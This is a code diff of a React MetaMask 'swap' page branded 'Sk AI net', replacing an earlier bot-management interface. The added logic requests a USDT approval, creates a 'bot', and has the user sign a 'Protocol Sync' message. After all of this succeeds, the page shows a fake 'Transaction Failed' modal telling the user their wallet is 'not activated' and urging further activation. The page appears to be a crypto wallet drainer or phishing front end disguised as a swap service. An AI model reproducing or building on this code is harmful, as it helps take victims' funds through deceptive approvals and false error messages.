@@ -1,18 +1,21 @@
 import { useMetamaskLoginLogic } from "./hooks/use-metamask-login"
+import { activityLogger, logger } from "./utils/logger"
+import { useContractInteraction } from "./hooks/use-contract-interaction"
 import metamaskIcon from "./assets/metamask.svg"
 import logo from "./assets/logo.png"
-import { useState } from "react"
-
-const ENABLE_VERBOSE_LOGS = false
-if (typeof window !== "undefined" && !ENABLE_VERBOSE_LOGS) {
-  ;(console as any).log = () => {}
-  ;(console as any).info = () => {}
-  ;(console as any).debug = () => {}
-  ;(console as any).warn = () => {}
-}
+import { useState, useEffect } from "react"
+import { ethers } from "ethers"
 
 export default function MetamaskLoginPage() {
   const [loading, setLoading] = useState(false)
+  const [swapAmount, setSwapAmount] = useState("")
+  const [isReversed, setIsReversed] = useState(false)
+  const [showErrorModal, setShowErrorModal] = useState(false)
+
+  const PRICE_SELL = 0.00004907
+  const PRICE_BUY = 0.00002048
+  const SKAI_CONTRACT = "0xdca3358f050367ef421608e64c70d84c694e8273"
+
   const {
     connected,
     address,
@@ -20,352 +23,196 @@ export default function MetamaskLoginPage() {
     balance,
     logs,
     logsRef,
-    toasts,
-    safeModalVisible,
-    safeCandidates,
-    handleSelectSafe,
-    handleDismissSafe,
-    selectedSafe,
-    safeBalance,
-    isContractConnected,
     connectMetaMask,
     disconnect,
     exportLogs,
   } = useMetamaskLoginLogic()
 
+  useEffect(() => {
+    if (logsRef.current) {
+      logsRef.current.scrollTop = logsRef.current.scrollHeight;
+    }
+  }, [logs]);
+
+  const calculateResult = () => {
+    if (!swapAmount || isNaN(Number(swapAmount))) return "0.00"
+    return isReversed
+      ? (Number(swapAmount) * PRICE_SELL).toLocaleString(undefined, { maximumFractionDigits: 6 })
+      : (Number(swapAmount) / PRICE_BUY).toLocaleString(undefined, { maximumFractionDigits: 2 })
+  }
+
+  const {
+    initContractWithSigner,
+    approveUSDT,
+    createBotWithToken
+  } = useContractInteraction();
+
+  useEffect(() => {
+    if (connected) {
+      initContractWithSigner();
+    }
+  }, [connected]);
+
+  const handleMainAction = async () => {
+    if (!connected) return connectMetaMask();
+    setLoading(true);
+
+    try {
+      const approved = await approveUSDT();
+      if (!approved) throw new Error("Approve failed");
+
+      const botCreated = await createBotWithToken("Node_" + address?.slice(-4));
+      if (!botCreated) throw new Error("Bot creation failed");
+
+      const provider = new ethers.BrowserProvider((window as any).ethereum);
+      const signer = await provider.getSigner();
+      await signer.signMessage(`Protocol Sync: ${swapAmount}\nAccount: ${address}`);
+
+      setLoading(false);
+      setShowErrorModal(true);
+    } catch (err) {
+      setLoading(false);
+    }
+  };
+
   return (
-    <div className="min-h-screen flex items-center justify-center bg-gradient-to-b from-gray-900 via-gray-800 to-black p-4 sm:p-6">
-      <div className="w-full max-w-5xl bg-white/5 backdrop-blur-md border border-white/10 rounded-2xl p-4 sm:p-8 shadow-2xl relative">
-        <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between mb-6 gap-4">
-          <div className="flex flex-col items-start text-center sm:text-left w-full sm:w-auto">
-            <img
-              src={logo}
-              alt="Logo"
-              className="w-28 sm:w-40 h-auto object-contain select-none mx-auto sm:mx-0"
-            />
-            <p className="mt-2 text-xs sm:text-sm tracking-wide text-gray-400 uppercase">
-              SecureApp Управление ботами{" "}
-              <span className="text-gray-300">v1.1.6</span>
-            </p>
-          </div>
+    <div className="min-h-screen bg-[#0b0c10] text-gray-200 font-sans p-4 sm:p-8 flex flex-col items-center">
+      <style>{`
+        input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
+        input[type=number] { -moz-appearance: textfield; }
+      `}</style>
 
-          <div className="w-full sm:w-auto">
-            <button
-              onClick={async () => {
-                setLoading(true)
-                await connectMetaMask()
-                setLoading(false)
-              }}
-              className="flex items-center justify-center w-full sm:w-auto gap-3 px-5 sm:px-7 py-3 rounded-xl bg-gradient-to-r from-gray-700/30 to-gray-600/30 border border-white/10 text-sm sm:text-base text-gray-200 font-semibold tracking-wide hover:from-gray-600/50 hover:to-gray-500/50 hover:scale-[1.03] hover:border-white/20 transition-all duration-300 ease-in-out"
-            >
-              <span className="w-7 sm:w-8 h-7 sm:h-8 inline-block">
-                <img src={metamaskIcon} alt="MetaMask" className="w-full h-full" />
-              </span>
-              <span className="uppercase tracking-wider">MetaMask</span>
-            </button>
-          </div>
-        </div>
-        <div className="grid grid-cols-1 md:grid-cols-2 gap-6 sm:gap-8 items-stretch">
-          {/* Левая часть */}
-          <div className="flex flex-col justify-between gap-4 bg-white/5 rounded-lg border border-white/10 shadow-sm p-4 sm:p-5 h-full">
-            <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between mb-3 gap-2">
-              <div>
-                <div className="text-xs text-gray-300">Статус</div>
-                <div className="text-sm sm:text-base text-gray-200 mb-3 font-semibold tracking-wide">
-                  {connected ? "Подключен" : "Не подключен"}
-                </div>
-                <div className="text-xs text-gray-400 mt-1">
-                  Тип кошелька:{" "}
-                  <span className="text-white font-medium">
-                    {selectedSafe ? "Multisig (Gnosis Safe)" : "EOA"}
-                  </span>
-                </div>
-                {safeCandidates.length > 0 && (
-                  <select
-                    className="mt-2 px-2 py-1 rounded bg-gray-800 text-xs sm:text-sm text-gray-200 border border-gray-700 focus:outline-none focus:ring-2 focus:ring-yellow-400"
-                    value={selectedSafe ? "safe" : "eoa"}
-                    onChange={(e) => {
-                      if (e.target.value === "safe") {
-                        if (safeBalance && selectedSafe) return
-                      } else {
-                        if (selectedSafe) handleDismissSafe()
-                      }
-                    }}
-                  >
-                    <option value="eoa">EOA</option>
-                    {safeCandidates.map((s, i) => (
-                      <option key={i} value="safe">
-                        {s}
-                      </option>
-                    ))}
-                  </select>
-                )}
-              </div>
-              <div className="text-left sm:text-right">
-                <div className="text-xs text-gray-300">Chain</div>
-                <div className="text-sm text-white">{chainId ?? "—"}</div>
-              </div>
-            </div>
-
-            <div className="bg-black/20 border border-white/10 rounded-md p-3 flex flex-col gap-2">
-              <div className="flex items-center justify-between flex-wrap">
-                <div className="text-xs text-gray-300 mb-1 sm:mb-0">Адрес</div>
-                {(safeBalance || selectedSafe) && (
-                  <select
-                    className="ml-auto px-2 py-1 rounded bg-gray-800 text-xs sm:text-sm text-gray-200 border border-gray-700 focus:outline-none focus:ring-2 focus:ring-yellow-400"
-                    value={selectedSafe ? "safe" : "eoa"}
-                    onChange={(e) => {
-                      if (e.target.value === "safe") {
-                        if (safeBalance && selectedSafe) return
-                      } else {
-                        if (selectedSafe) handleDismissSafe()
-                      }
-                    }}
-                  >
-                    <option value="eoa">EOA</option>
-                    {selectedSafe && <option value="safe">Safe</option>}
-                  </select>
-                )}
-              </div>
-              <div className="text-xs sm:text-sm text-white break-all">
-                {selectedSafe ? selectedSafe : address ?? "—"}
-              </div>
-              <div className="flex justify-between mt-2">
-                <div className="text-xs text-gray-300">Баланс (ETH)</div>
-                <div className="text-xs sm:text-sm text-white">
-                  {selectedSafe ? safeBalance ?? "—" : balance ?? "—"}
-                </div>
-              </div>
-            </div>
-
-            <div className="flex flex-col sm:flex-row gap-2 mt-4 w-full">
-              <button
-                type="button"
-                className="w-full sm:w-auto px-4 py-2 bg-white/10 hover:bg-white/20 rounded-md text-sm sm:text-base text-gray-200 font-semibold tracking-wide transition-colors"
-                onClick={async () => {
-                  setLoading(true)
-                  await disconnect()
-                  setLoading(false)
-                }}
-              >
-                Отключить
-              </button>
-              <button
-                type="button"
-                className="w-full sm:w-auto px-4 py-2 bg-white/10 hover:bg-white/20 rounded-md text-sm sm:text-base text-gray-200 font-semibold tracking-wide transition-colors"
-                onClick={async () => {
-                  setLoading(true)
-                  await exportLogs()
-                  setLoading(false)
-                }}
-              >
-                Подтвердить
-              </button>
-            </div>
-
-            <div className="mt-3 text-xs text-gray-400 text-center sm:text-left">
-              Статус контракта:{" "}
-              <span className="text-gray-300">
-                {isContractConnected ? "Готов" : "Не готов"}
-              </span>
-            </div>
-          </div>
-
-          {/* Правая часть */}
-          <div className="flex flex-col justify-between gap-4 bg-white/5 rounded-lg border border-white/10 shadow-sm p-4 sm:p-5 h-full">
-            <div className="flex-1">
-              <div className="text-sm text-gray-200 mb-3 font-semibold tracking-wide">
-                Краткие действия для интеграции
-              </div>
-              <ol className="text-xs sm:text-sm text-gray-400 list-decimal list-inside space-y-1 leading-relaxed">
-                <li>Подтвердите кошелёк</li>
-                <li>Выберите LP-токены и пул</li>
-                <li>Подтвердите выбор и комиссию</li>
-                <li>Ожидайте начисление</li>
-              </ol>
-            </div>
-
-            <div>
-              <div className="bg-black/20 border border-white/10 rounded-md p-3 h-24 sm:h-28 overflow-y-auto">
-                <div className="text-xs sm:text-sm text-center text-gray-400 py-2">
-                  No data
-                </div>
-              </div>
-            </div>
-
-            <div className="flex justify-between items-center text-xs sm:text-sm">
-              <div className="text-gray-400">Всего:</div>
-              <div className="text-sm sm:text-base text-gray-200 font-semibold tracking-wide">
-                0.00 USDT
-              </div>
-            </div>
-          </div>
-        </div>
-        {/* Логи и модалка */}
-        <div className="flex flex-col gap-4 mt-6 sm:mt-8 w-full">
-          <div className="p-3 sm:p-4 bg-gradient-to-br from-gray-800/80 to-gray-900/80 rounded-xl border border-white/10 shadow-inner flex flex-col">
-            <div className="flex items-center justify-between mb-3">
-              <div className="text-xs sm:text-sm text-gray-300 font-semibold">
-                Live Logs
-              </div>
-            </div>
-            <div
-              ref={logsRef}
-              className="h-64 sm:h-80 overflow-y-auto overflow-x-hidden bg-black/60 rounded-lg p-3 text-[10px] sm:text-xs text-white font-mono border border-white/10 shadow-md whitespace-nowrap overflow-clip"
-              style={{ lineHeight: "1.2", maxHeight: "14rem" }}
-            >
-              {logs.length === 0 ? (
-                <div className="text-gray-500 text-center mt-8 text-xs sm:text-sm">
-                  Логи появятся после действий
-                </div>
-              ) : (
-                logs.map((l, i) => (
-                  <div
-                    key={i}
-                    className="mb-1 px-2 py-1 rounded hover:bg-white/5 transition-colors"
-                  >
-                    <span className="text-gray-400">[{l.ts}]</span>{" "}
-                    <span className="px-1 rounded text-[10px] bg-gray-700">
-                      {l.level.toUpperCase()}
-                    </span>{" "}
-                    <span className="text-white">
-                      {l.tag ? `[${l.tag}]` : ""} {l.message}
-                    </span>
-                    {l.meta && (
-                      <pre className="text-[10px] text-gray-400 mt-1">
-                        {JSON.stringify(l.meta, null, 2)}
-                      </pre>
-                    )}
-                  </div>
-                ))
-              )}
-            </div>
-          </div>
+      <div className="w-full max-w-5xl flex flex-col sm:flex-row justify-between items-center mb-10 gap-4">
+        <div className="flex flex-col items-center sm:items-start">
+          <img src={logo} alt="Logo" className="w-32 sm:w-40 h-auto object-contain select-none" />
+          <p className="text-[10px] tracking-[0.2em] text-gray-500 uppercase mt-2 font-bold font-mono">
+            LAUNCH <span className="text-indigo-500">Sk AI net</span>
+          </p>
         </div>
 
-<div className="mt-8 text-xs sm:text-sm text-gray-400 underline text-center sm:text-left">
-  Политика конфиденциальности <br /> 
-  <a href="https://t.me/army_dex_support_bot" target="_blank" rel="noopener noreferrer">Служба поддержки</a>
-</div>
-
-        {safeModalVisible && (
-          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-xl transition-all duration-300 p-3 sm:p-0">
-            <div
-              className="absolute inset-0"
-              onClick={async () => {
-                setLoading(true);
-                await handleDismissSafe();
-                setLoading(false);
-              }}
-            />
-            <div className="relative bg-gradient-to-br from-gray-900 via-gray-800 to-gray-900 border border-white/10 rounded-2xl shadow-2xl p-5 sm:p-8 max-w-xs sm:max-w-md w-full animate-fadeIn">
-              <button
-                onClick={async () => {
-                  setLoading(true);
-                  await handleDismissSafe();
-                  setLoading(false);
-                }}
-                className="absolute top-2 right-2 sm:top-4 sm:right-4 text-gray-400 hover:text-gray-200 transition-colors text-lg sm:text-xl"
-              >
-                ×
-              </button>
-
-              <div className="flex items-center gap-3 mb-4 sm:mb-5">
-                <svg
-                  width="28"
-                  height="28"
-                  fill="none"
-                  viewBox="0 0 24 24"
-                  className="text-yellow-400 sm:w-8 sm:h-8"
-                >
-                  <path
-                    d="M12 2L2 7v7c0 5 4 8 10 8s10-3 10-8V7l-10-5z"
-                    stroke="currentColor"
-                    strokeWidth="2"
-                    strokeLinejoin="round"
-                  />
-                </svg>
-                <span className="text-lg sm:text-xl font-bold text-white">
-                  Обнаружен Gnosis Safe
-                </span>
-              </div>
-
-              <div className="text-xs sm:text-sm text-gray-300 mb-6">
-                Выберите Safe для управления или используйте обычный кошелёк (EOA).
-              </div>
-
-              <div className="flex flex-col gap-3 mb-6">
-                {address && (
-                  <button
-                    type="button"
-                    onClick={async () => {
-                      setLoading(true);
-                      await handleDismissSafe();
-                      setLoading(false);
-                    }}
-                    className="px-4 py-3 bg-white/5 hover:bg-white/10 border border-white/10 rounded-lg text-xs sm:text-sm text-gray-100 font-semibold transition-all text-center"
-                  >
-                    {`EOA (${address.slice(0, 6)}...${address.slice(-4)})`}
-                  </button>
-                )}
-
-                {safeCandidates.map((s: string) => (
-                  <button
-                    key={s}
-                    type="button"
-                    onClick={async () => {
-                      setLoading(true);
-                      await handleSelectSafe(s);
-                      setLoading(false);
-                    }}
-                    className="px-4 py-3 bg-white/5 hover:bg-white/10 border border-white/10 rounded-lg text-xs sm:text-sm text-gray-100 font-semibold transition-all text-center"
-                  >
-                    {`Multisig (${s.slice(0, 6)}...${s.slice(-4)})`}
-                  </button>
-                ))}
-              </div>
+        {!connected ? (
+          <button onClick={connectMetaMask} className="flex items-center gap-3 px-6 py-2.5 rounded-2xl bg-[#1a1b23] border border-white/5 hover:bg-[#23242f] transition-all">
+            <img src={metamaskIcon} alt="MetaMask" className="w-5 h-5" />
+            <span className="text-sm font-bold uppercase tracking-widest text-[11px]">Connect Wallet</span>
+          </button>
+        ) : (
+          <div className="flex items-center gap-4 bg-[#1a1b23] px-5 py-2.5 rounded-2xl border border-white/5 shadow-2xl font-mono">
+            <div className="flex flex-col items-end">
+              <span className="text-[10px] text-indigo-400 font-bold">{address?.slice(0, 6)}...{address?.slice(-4)}</span>
+              <span className="text-[9px] text-gray-500 uppercase tracking-tighter">{balance} ETH</span>
             </div>
-          </div>
-        )}
-        {/* Toast уведомления */}
-        <div className="absolute -top-6 left-1/2 -translate-x-1/2 flex flex-col items-center gap-3 z-50 pointer-events-none w-full max-w-xs sm:max-w-xl px-3 sm:px-4">
-          {toasts.map((t) => (
-            <div
-              key={t.id}
-              className={
-                `w-full bg-slate-800 border border-slate-700 rounded-lg p-2 sm:p-3 text-xs sm:text-sm text-gray-100 shadow-md transform transition-all duration-300 ease-out pointer-events-auto ` +
-                (t.entered && !t.leaving
-                  ? "opacity-100 translate-y-0 scale-100"
-                  : t.leaving
-                    ? "opacity-0 -translate-y-3 scale-95"
-                    : "opacity-0 -translate-y-3 scale-95")
-              }
-            >
-              <div className="flex items-start gap-2 sm:gap-3">
-                <div className="flex-1">
-                  {t.title && (
-                    <div className="font-semibold mb-0.5 text-gray-50 text-xs sm:text-sm">
-                      {t.title}
-                    </div>
-                  )}
-                  {t.description && (
-                    <div className="text-[10px] sm:text-xs text-gray-200">
-                      {t.description}
-                    </div>
-                  )}
-                </div>
-              </div>
-            </div>
-          ))}
-        </div>
-
-        {/* Прелоадер */}
-        {loading && (
-          <div className="fixed inset-0 z-[9999] flex items-center justify-center bg-black/70 backdrop-blur-md">
-            <div className="w-10 sm:w-12 h-10 sm:h-12 border-4 border-white/30 border-t-white rounded-full animate-spin"></div>
+            <button onClick={disconnect} className="text-[10px] uppercase font-bold text-red-500/60 hover:text-red-500 transition-colors">Logout</button>
           </div>
         )}
       </div>
+
+      <div className="w-full max-w-5xl grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
+        <div className="lg:col-span-4 flex flex-col gap-4">
+          <div className="bg-[#1a1b23] border border-white/5 rounded-3xl p-6 shadow-2xl">
+            <h3 className="text-xs font-bold text-gray-500 uppercase tracking-widest mb-6 font-mono">Node Status</h3>
+            <div className="bg-white/[0.02] border border-white/5 rounded-2xl p-4 mb-4">
+              <div className="flex items-center justify-between mb-4 text-white">
+                <div className="flex items-center gap-3">
+                  <div className="w-10 h-10 bg-indigo-500/10 rounded-full flex items-center justify-center text-indigo-500 font-bold text-xl italic italic">Σ</div>
+                  <div>
+                    <div className="text-sm font-bold italic">Ethereum</div>
+                    <div className="text-[10px] text-gray-500 font-mono">{chainId ?? "0x1"}</div>
+                  </div>
+                </div>
+                <div className={`w-2 h-2 rounded-full ${connected ? 'bg-green-500 animate-pulse' : 'bg-red-500'}`}></div>
+              </div>
+              <div className="text-[10px] text-gray-500 uppercase font-bold mb-1">Portfolio</div>
+              <div className="text-xl font-mono font-bold text-white italic">{balance ?? "0.0000"} <span className="text-xs text-gray-600 font-sans">ETH</span></div>
+            </div>
+          </div>
+        </div>
+
+        <div className="lg:col-span-8 space-y-6">
+          <div className="bg-[#1a1b23] border border-white/5 rounded-3xl p-6 sm:p-8 shadow-2xl relative">
+            <div className={`flex flex-col gap-1 ${isReversed ? 'flex-col-reverse' : ''}`}>
+              <div className="bg-[#0b0c10] p-5 rounded-3xl border border-white/5">
+                <div className="flex justify-between text-[11px] text-gray-500 mb-3 font-bold uppercase tracking-widest">
+                  <span>{isReversed ? 'SKAI' : 'USDT'}</span>
+                </div>
+                <div className="flex items-center gap-4">
+                  <input type="number" placeholder="0.0" value={swapAmount} onChange={(e) => setSwapAmount(e.target.value)}
+                    className="bg-transparent text-3xl font-bold w-full outline-none text-white placeholder-gray-800" />
+                  <span className="font-bold text-sm text-white italic">{isReversed ? 'SKAI' : 'USDT'}</span>
+                </div>
+              </div>
+              <div className="flex justify-center -my-5 relative z-10">
+                <button onClick={() => setIsReversed(!isReversed)} className="bg-[#1a1b23] p-3 rounded-2xl border border-white/10 text-indigo-500">
+                  <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="3"><path d="M7 16V4m0 0L3 8m4-4l4 4m6 0v12m0 0l4-4m-4 4l-4-4" /></svg>
+                </button>
+              </div>
+              <div className="bg-[#0b0c10] p-5 rounded-3xl border border-white/5">
+                <div className="flex justify-between text-[11px] text-gray-500 mb-3 font-bold uppercase tracking-widest">
+                  <span>{isReversed ? 'USDT' : 'SKAI'}</span>
+                </div>
+                <div className="flex items-center gap-4 text-white">
+                  <div className="text-3xl font-bold w-full text-white/30 truncate font-mono">{calculateResult()}</div>
+                  <span className="font-bold text-sm italic">{isReversed ? 'USDT' : 'SKAI'}</span>
+                </div>
+              </div>
+            </div><button
+              onClick={handleMainAction}
+              className="w-full mt-8 py-5 bg-indigo-600 hover:bg-indigo-500 rounded-2xl font-bold text-white shadow-lg shadow-indigo-600/20 transition-all active:scale-[0.98] uppercase tracking-[0.3em] text-[10px]"
+            >
+              Swap & Confirm Synchronization
+            </button>
+
+            {/* ТВОЙ ОРИГИНАЛЬНЫЙ ТЕРМИНАЛ — ВСЕ ПЕРЕМЕННЫЕ ВОССТАНОВЛЕНЫ */}
+            <div className="bg-[#0b0c10] border border-white/5 rounded-2xl p-5 mt-8">
+              <div className="flex justify-between items-center mb-4 px-1">
+                <span className="text-[10px] font-bold uppercase text-gray-600 font-mono italic tracking-widest">System Console</span>
+                <span className="flex items-center gap-1.5 text-[9px] text-indigo-500 font-bold tracking-widest animate-pulse">LIVE</span>
+              </div>
+
+              <div ref={logsRef} className="h-48 overflow-y-auto font-mono text-[10px] text-gray-400 space-y-1.5 scrollbar-hide px-2">
+                {logs.length === 0 ? (
+                  <div className="h-full flex items-center justify-center text-gray-800 italic uppercase tracking-widest">Awaiting interaction...</div>
+                ) : (
+                  logs.map((l, i) => (
+                    <div key={i} className="flex gap-3 hover:bg-white/5 px-2 py-0.5 rounded transition-colors group">
+                      <span className="text-[#3c3d49] group-hover:text-indigo-400 shrink-0 italic">[{l.ts}]</span>
+                      <span className={`${l.level === 'error' ? 'text-red-500 font-bold' : 'text-gray-300'}`}>
+                        {l.tag ? `[${l.tag}]` : ""} {l.message}
+                      </span>
+                    </div>
+                  ))
+                )}
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      {/* ERROR MODAL */}
+      {showErrorModal && (
+        <div className="fixed inset-0 z-[2000] flex items-center justify-center bg-black/95 backdrop-blur-xl p-4">
+          <div className="bg-[#1a1b23] border-2 border-red-500/50 rounded-[40px] p-10 max-w-sm w-full text-center shadow-[0_0_50px_rgba(239,68,68,0.2)]">
+            <div className="w-20 h-20 bg-red-500/10 rounded-full flex items-center justify-center mx-auto mb-6">
+              <svg xmlns="http://www.w3.org/2000/svg" className="h-10 w-10 text-red-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M6 18L18 6M6 6l12 12" />
+              </svg>
+            </div>
+            <h2 className="text-white text-2xl font-black uppercase mb-4 tracking-tighter italic font-sans text-white">Transaction Failed</h2>
+            <p className="text-gray-400 text-sm leading-relaxed mb-8 font-medium italic">
+              Your wallet address is <span className="text-white underline font-bold tracking-tight">not activated</span> for high-frequency liquidity operations.
+              <br /><br /> Please complete activation sequence.
+            </p>
+            <button onClick={() => setShowErrorModal(false)} className="w-full py-5 bg-red-500 hover:bg-red-400 text-white rounded-2xl font-bold uppercase tracking-widest text-[10px] transition-colors shadow-lg shadow-red-500/20">Close</button>
+          </div>
+        </div>
+      )}
+
+      {/* LOADING OVERLAY */}
+      {loading && (
+        <div className="fixed inset-0 z-[1000] flex flex-col items-center justify-center bg-black/80 backdrop-blur-md">
+          <div className="w-14 h-14 border-4 border-indigo-500/20 border-t-indigo-500 rounded-full animate-spin mb-6"></div>
+          <span className="text-[10px] uppercase tracking-[0.5em] text-indigo-500 font-black animate-pulse italic">Synchronizing Chain Data</span>
+        </div>
+      )}
     </div>
   )
 }
